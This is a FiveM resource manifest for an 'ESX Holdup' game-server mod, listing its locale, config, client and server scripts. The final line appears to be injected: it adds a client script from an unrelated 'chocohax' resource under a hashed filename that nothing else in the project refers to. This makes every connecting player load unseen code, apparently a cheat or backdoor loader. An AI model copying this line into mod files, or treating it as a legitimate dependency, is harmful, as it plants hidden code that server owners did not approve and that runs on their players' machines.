resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Holdup'

version '1.1.0'

client_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}

client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'